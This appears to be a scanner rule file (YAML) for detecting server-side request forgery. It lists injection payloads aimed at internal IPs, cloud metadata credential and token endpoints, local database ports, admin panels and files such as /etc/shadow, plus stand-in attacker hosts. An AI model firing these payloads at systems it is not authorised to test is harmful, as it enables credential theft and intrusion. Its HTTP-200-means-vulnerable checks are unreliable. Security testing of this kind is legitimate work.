# SSRF (Server-Side Request Forgery) Security Bambda
# Detects SSRF vulnerabilities in APIs

metadata:
  name: "SSRF Security Bambda"
  description: "Detects Server-Side Request Forgery vulnerabilities including internal network access, cloud metadata, and external service access"
  author: "Burp Automation Tool"
  version: "1.0.0"
  tags: ["ssrf", "server-side-request-forgery", "internal-network", "cloud-metadata", "external-service"]

rules:
  - name: "Internal Network Access"
    description: "Detects SSRF vulnerabilities allowing access to internal networks"
    severity: "High"
    confidence: "Medium"
    
    active:
      - when: "request"
        where: "request.parameters"
        inject:
          - payload: "url=http://192.168.1.1"
          - payload: "url=http://10.0.0.1"
          - payload: "url=http://172.16.0.1"
          - payload: "url=http://127.0.0.1"
          - payload: "url=http://localhost"
          - payload: "url=http://0.0.0.0"
        then:
          - if: "response.status == 200"
            issue: "Internal Network Access SSRF"
            detail: "SSRF vulnerability allowing access to internal networks"
            severity: "High"
            confidence: "Medium"

  - name: "Cloud Metadata Access"
    description: "Detects SSRF vulnerabilities allowing access to cloud metadata services"
    severity: "High"
    confidence: "Medium"
    
    active:
      - when: "request"
        where: "request.parameters"
        inject:
          - payload: "url=http://169.254.169.254/latest/meta-data/"
          - payload: "url=http://169.254.169.254/latest/meta-data/iam/security-credentials/"
          - payload: "url=http://169.254.169.254/latest/meta-data/instance-id"
          - payload: "url=http://169.254.169.254/latest/user-data"
          - payload: "url=http://169.254.169.254/latest/dynamic/instance-identity/document"
        then:
          - if: "response.status == 200"
            issue: "Cloud Metadata Access SSRF"
            detail: "SSRF vulnerability allowing access to cloud metadata"
            severity: "High"
            confidence: "Medium"

  - name: "AWS Metadata Access"
    description: "Detects SSRF vulnerabilities allowing access to AWS metadata"
    severity: "High"
    confidence: "Medium"
    
    active:
      - when: "request"
        where: "request.parameters"
        inject:
          - payload: "url=http://169.254.169.254/latest/meta-data/iam/security-credentials/ec2-instance"
          - payload: "url=http://169.254.169.254/latest/meta-data/iam/security-credentials/default"
          - payload: "url=http://169.254.169.254/latest/meta-data/iam/security-credentials/role-name"
          - payload: "url=http://169.254.169.254/latest/meta-data/security-credentials/ec2-instance"
        then:
          - if: "response.status == 200"
            issue: "AWS Metadata Access SSRF"
            detail: "SSRF vulnerability allowing access to AWS metadata"
            severity: "High"
            confidence: "Medium"

  - name: "Azure Metadata Access"
    description: "Detects SSRF vulnerabilities allowing access to Azure metadata"
    severity: "High"
    confidence: "Medium"
    
    active:
      - when: "request"
        where: "request.parameters"
        inject:
          - payload: "url=http://169.254.169.254/metadata/instance?api-version=2021-02-01"
          - payload: "url=http://169.254.169.254/metadata/identity/oauth2/token?api-version=2018-02-01"
          - payload: "url=http://169.254.169.254/metadata/identity/info?api-version=2019-08-01"
          - payload: "url=http://169.254.169.254/metadata/scheduledevents?api-version=2019-08-01"
        then:
          - if: "response.status == 200"
            issue: "Azure Metadata Access SSRF"
            detail: "SSRF vulnerability allowing access to Azure metadata"
            severity: "High"
            confidence: "Medium"

  - name: "Google Cloud Metadata Access"
    description: "Detects SSRF vulnerabilities allowing access to Google Cloud metadata"
    severity: "High"
    confidence: "Medium"
    
    active:
      - when: "request"
        where: "request.parameters"
        inject:
          - payload: "url=http://metadata.google.internal/computeMetadata/v1/"
          - payload: "url=http://metadata.google.internal/computeMetadata/v1/instance/service-accounts/"
          - payload: "url=http://metadata.google.internal/computeMetadata/v1/instance/attributes/"
          - payload: "url=http://metadata.google.internal/computeMetadata/v1/project/project-id"
        then:
          - if: "response.status == 200"
            issue: "Google Cloud Metadata Access SSRF"
            detail: "SSRF vulnerability allowing access to Google Cloud metadata"
            severity: "High"
            confidence: "Medium"

  - name: "Database Access SSRF"
    description: "Detects SSRF vulnerabilities allowing access to internal databases"
    severity: "High"
    confidence: "Medium"
    
    active:
      - when: "request"
        where: "request.parameters"
        inject:
          - payload: "url=http://localhost:3306"
          - payload: "url=http://localhost:5432"
          - payload: "url=http://localhost:27017"
          - payload: "url=http://localhost:6379"
          - payload: "url=http://localhost:1433"
        then:
          - if: "response.status == 200"
            issue: "Database Access SSRF"
            detail: "SSRF vulnerability allowing access to internal databases"
            severity: "High"
            confidence: "Medium"

  - name: "Admin Panel Access SSRF"
    description: "Detects SSRF vulnerabilities allowing access to admin panels"
    severity: "High"
    confidence: "Medium"
    
    active:
      - when: "request"
        where: "request.parameters"
        inject:
          - payload: "url=http://localhost:8080/admin"
          - payload: "url=http://localhost:8080/management"
          - payload: "url=http://localhost:8080/console"
          - payload: "url=http://localhost:8080/phpmyadmin"
          - payload: "url=http://localhost:8080/phpMyAdmin"
        then:
          - if: "response.status == 200"
            issue: "Admin Panel Access SSRF"
            detail: "SSRF vulnerability allowing access to admin panels"
            severity: "High"
            confidence: "Medium"

  - name: "External Service Access"
    description: "Detects SSRF vulnerabilities allowing access to external services"
    severity: "Medium"
    confidence: "Medium"
    
    active:
      - when: "request"
        where: "request.parameters"
        inject:
          - payload: "url=http://httpbin.org/get"
          - payload: "url=http://httpbin.org/headers"
          - payload: "url=http://httpbin.org/ip"
          - payload: "url=http://httpbin.org/user-agent"
          - payload: "url=http://httpbin.org/status/200"
        then:
          - if: "response.status == 200"
            issue: "External Service Access SSRF"
            detail: "SSRF vulnerability allowing access to external services"
            severity: "Medium"
            confidence: "Medium"

  - name: "File Protocol SSRF"
    description: "Detects SSRF vulnerabilities allowing file protocol access"
    severity: "High"
    confidence: "Medium"
    
    active:
      - when: "request"
        where: "request.parameters"
        inject:
          - payload: "url=file:///etc/passwd"
          - payload: "url=file:///etc/hosts"
          - payload: "url=file:///etc/shadow"
          - payload: "url=file:///proc/version"
          - payload: "url=file:///proc/cmdline"
        then:
          - if: "response.status == 200"
            issue: "File Protocol SSRF"
            detail: "SSRF vulnerability allowing file protocol access"
            severity: "High"
            confidence: "Medium"

  - name: "DNS Rebinding SSRF"
    description: "Detects SSRF vulnerabilities vulnerable to DNS rebinding"
    severity: "Medium"
    confidence: "Low"
    
    active:
      - when: "request"
        where: "request.parameters"
        inject:
          - payload: "url=http://attacker.com"
          - payload: "url=http://evil.com"
          - payload: "url=http://malicious.com"
          - payload: "url=http://hacker.com"
          - payload: "url=http://exploit.com"
        then:
          - if: "response.status == 200"
            issue: "DNS Rebinding SSRF"
            detail: "SSRF vulnerability potentially vulnerable to DNS rebinding"
            severity: "Medium"
            confidence: "Low"

filters:
  - name: "SSRF Prone Endpoints"
    when: "request"
    where: "request.url"
    include:
      - pattern: "/proxy"
        flags: "i"
      - pattern: "/fetch"
        flags: "i"
      - pattern: "/url"
        flags: "i"
      - pattern: "/link"
        flags: "i"
      - pattern: "/redirect"
        flags: "i"
      - pattern: "/webhook"
        flags: "i"
      - pattern: "/callback"
        flags: "i"
      - pattern: "/api/fetch"
        flags: "i"
      - pattern: "/api/proxy"
        flags: "i"

settings:
  max_payloads_per_parameter: 15
  timeout: 15000
  follow_redirects: false
  respect_robots_txt: false
